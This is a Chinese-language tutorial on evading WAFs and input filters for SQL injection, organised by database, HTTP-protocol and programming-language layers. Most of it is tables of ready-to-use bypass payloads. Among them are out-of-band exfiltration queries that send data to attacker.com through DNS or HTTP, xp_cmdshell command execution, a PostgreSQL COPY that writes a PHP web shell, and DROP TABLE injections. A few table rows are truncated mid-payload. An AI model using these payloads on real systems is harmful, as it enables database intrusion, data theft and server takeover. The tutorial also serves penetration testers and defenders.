一、SQL 注入绕过思路介绍

SQL 注入绕过的本质是攻击者利用 安全过滤层（WAF 或应用层过滤组件） 与 数据库 对同一输入的 解析差异，构造出安全过滤层无法正常检测，而数据库仍可以正常执行的 Payload，从而绕过安全检测，实现恶意 SQL 代码的注入与执行。

根本原因：

  • 使用字符串拼接构造 SQL 语句，而非 参数化查询。
  • 安全过滤层 缺失、配置错误或规则不完善，未能有效拦截恶意输入。
  • 数据库 错误信息 被直接返回给前端，为渗透提供便利。

防御思路：使用参数化查询、正确配置安全过滤层、避免向用户暴露错误信息。

SQL 注入绕过思路：

根据业务猜解过滤范围，通过构造差异化的输入，观察安全过滤层响应，推断其检测逻辑，利用解析盲区构建有效 Payload。

二、安全过滤层检测基本原理

现代安全过滤层通常采用多层次、多维度的检测机制，各类技术协同工作。根据检测原理，可归纳为以下几大类：

1. 基于签名的规则匹配

通过 预定义规则库，匹配请求参数中的 SQL 注入特征。规则库通常由安全厂商或社区维护，包含常见攻击模式。

  • 优点：实现简单，性能高，对已知攻击识别准确。
  • 缺点：依赖规则更新，难以应对变形、编码等绕过手法。

2. 基于语法解析的检测

使用 内置 SQL 解析器 对请求参数进行分析，检测其 SQL 注入特征。

  • 优点：不依赖固定字符串，能识别多种变形和混淆。
  • 缺点：计算资源消耗较大，对复杂查询可能存在误报。

3. 基于机器学习的行为分析

通过训练 正常流量模型，计算请求与正常模型的 偏离度 来量化攻击特征。模型可包括监督学习、无监督学习或深度学习。

  • 优点：能够发现未知攻击，适应业务变化。
  • 缺点：需要大量训练数据，存在误报可能，实时性要求高。

4. 基于流量基线的异常检测（非机器学习）

采用 固定统计模型 检测请求特征是否偏离正常范围。常见于硬件 WAF 或简单行为分析模块。

  • 优点：无需训练，部署快。
  • 缺点：难以应对复杂多变的业务。

5. 基于规则链的动态组合

许多安全过滤层并非单一规则生效，而是将多条规则通过逻辑运算符组合成策略链，形成更复杂的判定条件。

  • 优点：降低误报，实现精细化控制。
  • 缺点：配置复杂，需深度理解业务场景。

6. 辅助技术

  • 解码与标准化：递归解码参数，还原初始 Payload，防止编码绕过。
  • IP 信誉与速率控制：对发起大量恶意请求的 IP 进行临时或永久封禁，阻断扫描行为。
  • 响应体检查：监测响应包中出现的数据库错误和敏感信息，阻断信息泄露。
  • 蜜罐/陷阱机制：在页面中植入隐蔽字段或脚本，当攻击者探测时触发告警并阻断。
  • 动态规则生成与自动更新：根据攻击日志自动生成临时规则，或是从云端同步最新规则集，保持防护时效性。

三、数据库底层

包含数据库自身的 SQL 语法、字符集处理、函数行为等特性。

1. 注释与空白符差异

数据库支持多种空白符和注释符，安全过滤层可能仅过滤普通空格或简单注释。

示例 说明
?id=1%0aunion%0aselect%0a1,2,3 使用换行符 %0a 代替空格
?id=1/**/union/**/select/**/1,2,3 使用多行注释 /**/ 分割关键字
?id=1/*!50000union*/ select 1,2,3 使用 MySQL 内联注释 /*!...*/ 绕过

2. 等价函数与操作符替换

SQL 中同一功能支持多种语法表达，安全过滤层可能只拦截部分。

原特征 等价绕过示例 说明
and / or &&、`
= like、in、regexp、between、<> 比较操作符替代
substr() / mid() substring()、left()、right() 字符串截取函数替代
sleep() benchmark()、笛卡尔积延时 延时函数替代
user() @@user 变量替代函数
database() schema() 函数别名

3. 编码与字符集差异（宽字节注入）

数据库连接字符集与安全过滤层解析字符集不同，导致参数逃逸。

示例 说明
?id=1%df%27 or 1=1-- 在 GBK 环境下，%df 与反斜杠组成汉字，使单引号逃逸

4. 特殊语法与数据类型

数据库支持非标准语法或隐式类型转换，安全过滤层可能忽略。

示例 说明
id=1e0union select 科学计数法表示数字，绕过空格检测
0x61646D696E 十六进制字符串代替 'admin'，绕过引号过滤
\N MySQL 中代表 NULL，可绕过某些检查

5. 数据库报错信息利用

构造错误 SQL 使数据库返回错误信息，用于报错注入，当安全过滤层仅拦截常规注入而未阻断报错时利用。

示例 说明
extractvalue(1,concat(0x7e,database())) 利用 extractvalue 函数报错回显数据
updatexml(1,concat(0x7e,database()),1) 利用 updatexml 函数报错回显数据
floor()双查询报错 利用 count()、group by 和 rand() 产生主键冲突报错回显数据

6. 不同数据库特有语法与函数

不同数据库管理系统（DBMS）存在独特语法和函数，可针对性绕过。

数据库 示例 说明
MSSQL ' WAITFOR DELAY '0:0:5'-- 时间盲注替代 sleep()
exec xp_cmdshell 'whoami' 执行系统命令（需高权限）
SELECT * FROM users WHERE id = 1; EXEC master..xp_cmdshell 'dir' 堆叠查询执行命令
SELECT 1 WHERE 1=1; WAITFOR DELAY '0:0:5' 堆叠注入结合延时
Oracle SELECT 1 FROM dual WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5) 延时盲注函数
`SELECT UTL_HTTP.REQUEST(‘http://attacker.com/‘
SELECT 1 FROM dual WHERE 1=DBMS_LOCK.SLEEP(5) 延时函数（部分版本）
SELECT * FROM users WHERE id = 1 AND 1=ctxsys.drithsx.sn(1,1) 报错注入函数
PostgreSQL SELECT pg_sleep(5) 延时函数
COPY (SELECT '<?php system($_GET[cmd]);?>') TO '/var/www/shell.php' 文件写入
SELECT 1 FROM pg_class WHERE 1=1 AND (SELECT current_setting('block_size'))::int>0 报错注入

四、HTTP 协议层

利用安全过滤层与后端 Web 服务器对 HTTP 协议细节处理不同，可能导致绕过。

1. HTTP 参数污染（HPP）

安全过滤层可能仅检查第一个同名参数，而 Web 服务器取最后一个或合并。

示例 说明
?id=1&id=union select 安全过滤层检查第一个 id=1 放行，后端取最后一个 id=union select 造成注入，具体结果取决于后端 Web 服务器

2. 分块传输编码（Chunked Transfer Encoding）

将恶意 Payload 分块发送，安全过滤层未重组检查，而 Web 服务器自动解码重组。

示例 说明
Transfer-Encoding: chunked 请求体分块 将 union select 等关键字拆分到多个块中，使每个块单独检测时不触发规则

3. HTTP 方法变异

安全过滤层规则可能只针对特定 HTTP 方法，使用其他方法可绕过。

示例 说明
将 GET 改为 HEAD、PUT、OPTIONS 等 绕过仅对 GET/POST 生效的规则
使用 POST 发送 GET 参数，或反之 利用安全过滤层对不同方法的不同检测粒度

4. Content-Type 与编码头欺骗

安全过滤层可能仅解析特定 Content-Type，或忽略字符集声明，导致解码差异。

示例 说明
声明 Content-Type: application/x-www-form-urlencoded 但实际使用 multipart/form-data 包裹注入点 安全过滤层按表单解析，后端按多部分解析，导致检测盲区
在 Header 中声明 charset=ibm500 等特殊编码 诱导安全过滤层与后端解码不一致，使恶意字符被误读

5. 畸形请求行与协议降级

安全过滤层对 HTTP 协议规范解析严格，而 Web 服务器容错性强，可利用畸形请求绕过。

示例 说明
使用 HTTP/0.9 或省略版本号 使安全过滤层无法正确解析请求行
在请求行中加入额外空格、换行等 利用安全过滤层与服务器对协议容忍度的差异

五、编程语言层

编程语言在解析输入和调用数据库接口时的行为差异，可能产生绕过机会。

1. 字符串处理与编码转换

语言内部对输入字符串的编码转换可能改变字符，导致安全过滤层检测失效。

示例 说明
PHP 的 addslashes() 不处理多字节字符，配合宽字节注入 %df%27 使反斜杠丢失，单引号逃逸
Python 中 urllib.parse.unquote 与 bytes.decode 多次解码差异 利用多次解码造成安全过滤层与后端解码次数不一致

2. 正则表达式缺陷

安全过滤层使用的正则表达式可能存在逻辑缺陷，如未使用多行模式、边界匹配错误。

示例 说明
利用换行符绕过 ^ 和 $ 边界 1\nunion select 使正则仅匹配行首
使用 /*!50000union*/ 绕过不匹配内联注释的正则 正则未考虑 MySQL 条件注释语法

3. 全局变量与配置

PHP 的 magic_quotes_gpc、auto_append_file 等全局配置可能影响输入处理，安全过滤层未考虑。

示例 说明
当 magic_quotes_gpc 开启时，输入被自动转义 安全过滤层基于未转义版本检测，实际转义后不再构成攻击。属于历史特性，可用于绕过安全过滤层

4. 接口调用差异

不同数据库扩展对参数化查询的实现不同，错误的 API 使用可能导致注入。

示例 说明
PHP 中 mysqli_query() 直接拼接，而 mysqli_prepare() 使用参数化 若开发者误用前者，安全过滤层即使放行，后端仍存在注入
Java 中 Statement 与 PreparedStatement 的混用 某些查询使用拼接，安全过滤层无法区分

5. 语言层面的输入截断

某些语言在特定条件下会截断输入，导致安全过滤层检测的完整 Payload 与数据库实际接收的部分不一致。

示例 说明
使用 %00 空字节截断 C 语言字符串以 \0 结尾，截断后数据库仅接收 %00 之前的内容
使用 mb_convert_encoding 截断 PHP 中特定编码转换可能导致字符串被截断，使后续恶意部分被丢弃

六、其他绕过技术

1. DNSlog 外带注入

当安全过滤层拦截了报错信息、延时函数，且页面无回显时，可利用 DNS 协议将数据外带出来。

示例 说明
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\test')) MySQL 利用 DNS 解析将数据库名带出
`SELECT * FROM users WHERE id=1 AND 1=(SELECT UTL_HTTP.REQUEST(‘http://attacker.com/‘
SELECT * FROM dblink('host=attacker.com dbname=test', 'SELECT user') RETURNS (result text) PostgreSQL 配合 DNS（需安装扩展）
DECLARE @a varchar(1024);SELECT @a=db_name();EXEC('master..xp_dirtree "\\\\'+@a+'.attacker.com\\test"'); MSSQL 利用 xp_dirtree 发起 DNS 请求

2. JSON/XML 注入

当 API 接口接收 JSON 或 XML 格式数据，且后端直接拼接至 SQL 语句时，可利用结构化数据绕过检测。

示例 说明
{"username":"admin' OR '1'='1","password":"test"} JSON 参数中包含 SQL 注入，安全过滤层可能未解析 JSON 内容
<user><name>admin' OR '1'='1</name><pass>test</pass></user> XML 参数中包含 SQL 注入，安全过滤层可能未深度解析 XML
{"id":1, "orderby": "name; DROP TABLE users--"} 利用 JSON 中的键名注入（如排序字段）

3. WebSocket 协议绕过

WebSocket 是持久化双向通信协议，部分安全过滤层对 WebSocket 流量检测能力不足。

示例 说明
通过 WebSocket 发送 {"type":"query","sql":"' OR 1=1--"} 将注入点转移至 WebSocket 消息中
利用 WebSocket 帧分片将恶意 SQL 分散到多个帧中 模拟分块传输思想，使安全过滤层难以重组检测

七、总结

维度 核心思路 典型技术
数据库底层 利用 SQL 语法、函数、编码差异 注释、等价替换、宽字节、报错注入、DBMS 特有函数
HTTP协议层 利用协议解析与Web服务器差异 参数污染、分块传输、方法变异、WebSocket
编程语言层 利用语言特性与配置缺陷 编码转换、正则缺陷、API 误用、输入截断
高阶技术 利用隐蔽通道与新型协议 DNSlog 外带、JSON/XML 注入

核心思路：绕过技术不是单点突破，而是 多层组合。理解多个维度及高阶手法，尝试系统化设计绕过策略。
